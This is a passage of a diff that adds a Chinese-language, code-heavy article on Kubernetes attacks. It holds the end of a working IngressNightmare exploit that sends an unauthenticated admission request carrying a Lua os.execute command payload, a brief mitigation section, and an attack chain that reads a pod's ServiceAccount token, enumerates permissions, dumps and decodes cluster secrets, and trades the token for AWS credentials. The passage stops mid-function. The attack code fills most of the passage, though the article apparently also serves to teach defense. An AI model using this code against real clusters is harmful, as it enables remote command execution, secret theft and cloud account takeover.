+                    <span class="s2">&quot;nginx.ingress.kubernetes.io/server-snippet&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">                        location /healthz </span><span class="se">{{</span>
+<span class="s2">                            content_by_lua_block </span><span class="se">{{</span>
+<span class="s2">                                os.execute(&quot;</span><span class="si">{</span><span class="n">payload_cmd</span><span class="si">}</span><span class="s2">&quot;)</span>
+<span class="s2">                            </span><span class="se">}}</span>
+<span class="s2">                        </span><span class="se">}}</span>
+<span class="s2">                    &quot;&quot;&quot;</span>
+                <span class="p">}</span>
+            <span class="p">},</span>
+            <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;rules&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                    <span class="s2">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;legitimate.example.com&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;http&quot;</span><span class="p">:</span> <span class="p">{</span>
+                        <span class="s2">&quot;paths&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                            <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span>
+                            <span class="s2">&quot;pathType&quot;</span><span class="p">:</span> <span class="s2">&quot;Prefix&quot;</span><span class="p">,</span>
+                            <span class="s2">&quot;backend&quot;</span><span class="p">:</span> <span class="p">{</span>
+                                <span class="s2">&quot;service&quot;</span><span class="p">:</span> <span class="p">{</span>
+                                    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;frontend&quot;</span><span class="p">,</span>
+                                    <span class="s2">&quot;port&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;number&quot;</span><span class="p">:</span> <span class="mi">80</span><span class="p">}</span>
+                                <span class="p">}</span>
+                            <span class="p">}</span>
+                        <span class="p">}]</span>
+                    <span class="p">}</span>
+                <span class="p">}]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1"># 构造 AdmissionReview</span>
+        <span class="n">admission_review</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;admission.k8s.io/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;AdmissionReview&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;request&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;uid&quot;</span><span class="p">:</span> <span class="s2">&quot;00000000-0000-0000-0000-000000000001&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;group&quot;</span><span class="p">:</span> <span class="s2">&quot;networking.k8s.io&quot;</span><span class="p">,</span> <span class="s2">&quot;version&quot;</span><span class="p">:</span> <span class="s2">&quot;v1&quot;</span><span class="p">,</span> <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;Ingress&quot;</span><span class="p">},</span>
+                <span class="s2">&quot;resource&quot;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="s2">&quot;group&quot;</span><span class="p">:</span> <span class="s2">&quot;networking.k8s.io&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;version&quot;</span><span class="p">:</span> <span class="s2">&quot;v1&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;resource&quot;</span><span class="p">:</span> <span class="s2">&quot;ingresses&quot;</span>
+                <span class="p">},</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;legitimate-ingress&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;default&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;operation&quot;</span><span class="p">:</span> <span class="s2">&quot;CREATE&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;userInfo&quot;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;system:anonymous&quot;</span><span class="p">,</span>
+                    <span class="s2">&quot;groups&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;system:unauthenticated&quot;</span><span class="p">]</span>
+                <span class="p">},</span>
+                <span class="s2">&quot;object&quot;</span><span class="p">:</span> <span class="n">malicious_ingress</span><span class="p">,</span>
+                <span class="s2">&quot;oldObject&quot;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
+                <span class="s2">&quot;dryRun&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+                <span class="s2">&quot;options&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;CreateOptions&quot;</span><span class="p">,</span> <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;meta.k8s.io/v1&quot;</span><span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">admission_review</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">send_exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload_cmd</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;id &gt; /tmp/pwned&quot;</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;发送恶意 AdmissionReview 到 webhook&quot;&quot;&quot;</span>
+        <span class="n">review</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">craft_malicious_admission_review</span><span class="p">(</span><span class="n">payload_cmd</span><span class="p">)</span>
+
+        <span class="c1"># ingress-nginx webhook 不验证请求来源 (漏洞核心)</span>
+        <span class="c1"># 攻击者无需认证即可直接访问</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">webhook_url</span><span class="p">,</span>
+            <span class="n">json</span><span class="o">=</span><span class="n">review</span><span class="p">,</span>
+            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">},</span>
+            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="c1"># webhook 使用自签证书</span>
+            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+        <span class="p">)</span>
+
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;status_code&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span>
+            <span class="s2">&quot;response&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span> <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="k">else</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span>
+            <span class="s2">&quot;payload_executed&quot;</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
+        <span class="p">}</span>
+
+
+<span class="c1"># === 防御: IngressNightmare 缓解 ===</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">IngressNightmareDefense</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;IngressNightmare 防御配置&quot;&quot;&quot;</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">restrict_webhook_access</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;限制 webhook 仅接受来自 API Server 的请求&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="c1"># ingress-nginx controller 启动参数</span>
+            <span class="s2">&quot;args&quot;</span><span class="p">:</span> <span class="p">[</span>
+                <span class="s2">&quot;--validating-webhook-certificate=/usr/local/certificates/cert.pem&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;--validating-webhook-key=/usr/local/certificates/key.pem&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;--enable-ssl-chain-completion=false&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;--validating-webhook=:8443&quot;</span><span class="p">,</span>
+                <span class="c1"># 关键: 限制 webhook 仅接受来自 API Server 的连接</span>
+                <span class="s2">&quot;--watch-ingress-without-class=false&quot;</span><span class="p">,</span>
+            <span class="p">],</span>
+            <span class="c1"># NetworkPolicy 限制 webhook 端口</span>
+            <span class="s2">&quot;network_policy&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;networking.k8s.io/v1&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;NetworkPolicy&quot;</span><span class="p">,</span>
+                <span class="s2">&quot;metadata&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;restrict-ingress-webhook&quot;</span><span class="p">},</span>
+                <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="s2">&quot;podSelector&quot;</span><span class="p">:</span> <span class="p">{</span>
+                        <span class="s2">&quot;matchLabels&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;app.kubernetes.io/name&quot;</span><span class="p">:</span> <span class="s2">&quot;ingress-nginx&quot;</span><span class="p">}</span>
+                    <span class="p">},</span>
+                    <span class="s2">&quot;policyTypes&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;Ingress&quot;</span><span class="p">],</span>
+                    <span class="s2">&quot;ingress&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                        <span class="s2">&quot;from&quot;</span><span class="p">:</span> <span class="p">[{</span>
+                            <span class="s2">&quot;namespaceSelector&quot;</span><span class="p">:</span> <span class="p">{</span>
+                                <span class="s2">&quot;matchLabels&quot;</span><span class="p">:</span> <span class="p">{</span>
+                                    <span class="s2">&quot;kubernetes.io/metadata.name&quot;</span><span class="p">:</span> <span class="s2">&quot;kube-system&quot;</span>
+                                <span class="p">}</span>
+                            <span class="p">}</span>
+                        <span class="p">}],</span>
+                        <span class="s2">&quot;ports&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;protocol&quot;</span><span class="p">:</span> <span class="s2">&quot;TCP&quot;</span><span class="p">,</span> <span class="s2">&quot;port&quot;</span><span class="p">:</span> <span class="mi">8443</span><span class="p">}]</span>
+                    <span class="p">}]</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">disable_lua_in_annotations</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;禁用 annotation 中的 Lua 执行&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;nginx.ingress.kubernetes.io/enable-lua&quot;</span><span class="p">:</span> <span class="s2">&quot;false&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;nginx.ingress.kubernetes.io/allow-snippet-annotations&quot;</span><span class="p">:</span> <span class="s2">&quot;false&quot;</span><span class="p">,</span>
+        <span class="p">}</span>
+</code></pre></div>
+
+<h3>4.3 ServiceAccount Token → 云 IAM 攻击链</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">K8s ServiceAccount Token → 云 IAM 横向移动</span>
+<span class="sd">在 EKS/GKE/AKS 中，K8s SA 通过 Workload Identity 映射到云 IAM 角色</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">SATokenToCloudIAM</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;SA Token 到云 IAM 的攻击链仿真&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sa_token_path</span> <span class="o">=</span> <span class="s2">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_server</span> <span class="o">=</span> <span class="s2">&quot;https://kubernetes.default.svc&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">ca_cert</span> <span class="o">=</span> <span class="s2">&quot;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">read_sa_token</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 1: 读取容器内的 ServiceAccount Token&quot;&quot;&quot;</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sa_token_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">token</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+        <span class="c1"># JWT 解码查看权限</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+        <span class="n">parts</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;==&quot;</span><span class="p">)</span>
+        <span class="n">payload_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] SA Token issuer: </span><span class="si">{</span><span class="n">payload_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;iss&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] SA Token sub: </span><span class="si">{</span><span class="n">payload_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sub&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] SA Token aud: </span><span class="si">{</span><span class="n">payload_json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;aud&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">token</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">enumerate_permissions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 2: 枚举 SA 权限&quot;&quot;&quot;</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+
+        <span class="c1"># 使用 kubectl auth can-i --list 等效 API 调用</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_server</span><span class="si">}</span><span class="s2">/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+            <span class="s2">&quot;apiVersion&quot;</span><span class="p">:</span> <span class="s2">&quot;authorization.k8s.io/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;kind&quot;</span><span class="p">:</span> <span class="s2">&quot;SelfSubjectRulesReview&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;spec&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="s2">&quot;default&quot;</span><span class="p">}</span>
+        <span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/json&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 禁用 SSL 验证 (集群内通信)</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
+        <span class="n">ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
+        <span class="n">ctx</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">ctx</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="n">ctx</span><span class="p">)</span>
+        <span class="n">rules</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="c1"># 分析危险权限</span>
+        <span class="n">dangerous_perms</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">rule</span> <span class="ow">in</span> <span class="n">rules</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">][</span><span class="s2">&quot;resourceRules&quot;</span><span class="p">]:</span>
+            <span class="n">verbs</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;verbs&quot;</span><span class="p">,</span> <span class="p">[])</span>
+            <span class="n">resources</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;resources&quot;</span><span class="p">,</span> <span class="p">[])</span>
+
+            <span class="k">if</span> <span class="s2">&quot;*&quot;</span> <span class="ow">in</span> <span class="n">verbs</span><span class="p">:</span>
+                <span class="n">dangerous_perms</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;rule&quot;</span><span class="p">:</span> <span class="n">rule</span><span class="p">,</span> <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="s2">&quot;wildcard verb&quot;</span><span class="p">})</span>
+            <span class="k">if</span> <span class="s2">&quot;secrets&quot;</span> <span class="ow">in</span> <span class="n">resources</span><span class="p">:</span>
+                <span class="n">dangerous_perms</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;rule&quot;</span><span class="p">:</span> <span class="n">rule</span><span class="p">,</span> <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="s2">&quot;secrets access&quot;</span><span class="p">})</span>
+            <span class="k">if</span> <span class="s2">&quot;pods&quot;</span> <span class="ow">in</span> <span class="n">resources</span> <span class="ow">and</span> <span class="s2">&quot;create&quot;</span> <span class="ow">in</span> <span class="n">verbs</span><span class="p">:</span>
+                <span class="n">dangerous_perms</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;rule&quot;</span><span class="p">:</span> <span class="n">rule</span><span class="p">,</span> <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="s2">&quot;can create pods&quot;</span><span class="p">})</span>
+            <span class="k">if</span> <span class="s2">&quot;clusterrolebindings&quot;</span> <span class="ow">in</span> <span class="n">resources</span><span class="p">:</span>
+                <span class="n">dangerous_perms</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                    <span class="s2">&quot;rule&quot;</span><span class="p">:</span> <span class="n">rule</span><span class="p">,</span>
+                    <span class="s2">&quot;reason&quot;</span><span class="p">:</span> <span class="s2">&quot;can modify RBAC = cluster admin&quot;</span>
+                <span class="p">})</span>
+
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;all_rules&quot;</span><span class="p">:</span> <span class="n">rules</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">][</span><span class="s2">&quot;resourceRules&quot;</span><span class="p">],</span>
+            <span class="s2">&quot;dangerous_permissions&quot;</span><span class="p">:</span> <span class="n">dangerous_perms</span>
+        <span class="p">}</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">steal_secrets</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 3: 窃取 K8s Secrets&quot;&quot;&quot;</span>
+        <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+
+        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_server</span><span class="si">}</span><span class="s2">/api/v1/namespaces/default/secrets&quot;</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">req</span><span class="o">.</span><span class="n">add_header</span><span class="p">(</span><span class="s2">&quot;Authorization&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>
+        <span class="n">ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
+        <span class="n">ctx</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">ctx</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">context</span><span class="o">=</span><span class="n">ctx</span><span class="p">)</span>
+        <span class="n">secrets</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+
+        <span class="n">stolen</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">secret</span> <span class="ow">in</span> <span class="n">secrets</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;items&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+            <span class="n">name</span> <span class="o">=</span> <span class="n">secret</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
+            <span class="n">secret_type</span> <span class="o">=</span> <span class="n">secret</span><span class="p">[</span><span class="s2">&quot;type&quot;</span><span class="p">]</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="p">{})</span>
+
+            <span class="c1"># 解码 base64 数据</span>
+            <span class="n">decoded</span> <span class="o">=</span> <span class="p">{}</span>
+            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+                <span class="n">decoded</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&quot;replace&quot;</span><span class="p">)</span>
+
+            <span class="n">stolen</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
+                <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="n">secret_type</span><span class="p">,</span>
+                <span class="s2">&quot;data_keys&quot;</span><span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="n">decoded</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
+            <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">stolen</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">escalate_to_cloud</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">cloud</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;aws&quot;</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;步骤 4: 通过 Workload Identity 横向到云 IAM&quot;&quot;&quot;</span>
+
+        <span class="k">if</span> <span class="n">cloud</span> <span class="o">==</span> <span class="s2">&quot;aws&quot;</span><span class="p">:</span>
+            <span class="c1"># EKS: SA token → AWS STS AssumeRoleWithWebIdentity</span>
+            <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+
+            <span class="c1"># 1. 获取 AWS 角色 ARN (从 SA 注解或环境变量)</span>
+            <span class="n">role_arn</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;AWS_ROLE_ARN&quot;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">role_arn</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] AWS_ROLE_ARN not found, checking SA annotations...&quot;</span><span class="p">)</span>
+                <span class="k">return</span> <span class="kc">None</span>
+
+            <span class="c1"># 2. 使用 SA token 向 STS 换取 AWS 临时凭证</span>
+            <span class="n">url</span> <span class="o">=</span> <span class="p">(</span>
+                <span class="sa">f</span><span class="s2">&quot;https://sts.amazonaws.com/&quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;?Action=AssumeRoleWithWebIdentity&quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;&amp;Version=2011-06-15&quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;&amp;RoleArn=</span><span class="si">{</span><span class="n">role_arn</span><span class="si">}</span><span class="s2">&quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;&amp;RoleSessionName=exploit-session&quot;</span>
+                <span class="sa">f</span><span class="s2">&quot;&amp;WebIdentityToken=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span>
+            <span class="p">)</span>
+
+            <span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="p">)</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+
+            <span class="c1"># 解析 AWS 凭证</span>
+            <span class="kn">import</span><span class="w"> </span><span class="nn">xml.etree.ElementTree</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">ET</span>
+            <span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+            <span class="n">creds</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">find</span><span class="p">(</span>
+                <span class="s2">&quot;.//{https://sts.amazonaws.com/doc/2011-06-15/}Credentials&quot;</span>
+            <span class="p">)</span>
+
+            <span class="n">aws_creds</span> <span class="o">=</span> <span class="p">{</span>
